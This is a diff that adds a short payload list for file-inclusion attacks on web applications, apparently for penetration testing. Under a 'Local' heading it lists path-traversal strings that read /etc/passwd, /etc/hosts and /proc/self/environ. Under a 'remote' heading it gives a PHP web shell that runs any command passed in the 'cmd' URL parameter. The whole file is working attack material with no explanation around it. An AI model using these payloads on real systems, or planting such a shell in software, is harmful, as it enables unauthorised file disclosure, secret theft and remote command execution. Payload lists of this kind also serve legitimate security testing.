@@ -1,0 +1,11 @@
+### Local
+../../../../etc/passwd
+../../../etc/passwd
+../../../../etc/hosts
+../../../../proc/self/environ
+
+### remote
+<?php
+echo "<h2>RFI Successful</h2>";
+system($_GET['cmd']);
+?>
